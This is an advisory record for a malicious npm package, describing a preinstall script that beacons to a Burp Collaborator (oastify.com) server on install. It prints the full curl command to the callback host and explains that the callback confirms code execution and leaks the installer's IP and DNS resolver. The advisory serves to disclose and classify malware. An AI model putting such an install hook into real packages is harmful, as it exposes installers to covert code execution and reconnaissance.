summary: preinstall beacon to Burp Collaborator out-of-band server
details: package.json declares a preinstall lifecycle script that runs `curl -s https://z11f95fv69kjc0s88ex6l1f04raiyamz.oastify.com >/dev/null 2>&1 || true`. On `npm install`, this fires an automatic DNS lookup and HTTPS request to a unique subdomain of oastify.com (Burp Collaborator), an out-of-band interaction server typically used for reconnaissance and dependency-confusion proof-of-concept exfiltration. The unique subdomain token allows the operator to correlate the callback with the targeted environment, confirming code execution on the installer's machine and leaking host/network metadata (source IP, DNS resolver). The package provides no legitimate functionality — it exists solely to fire this callback.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
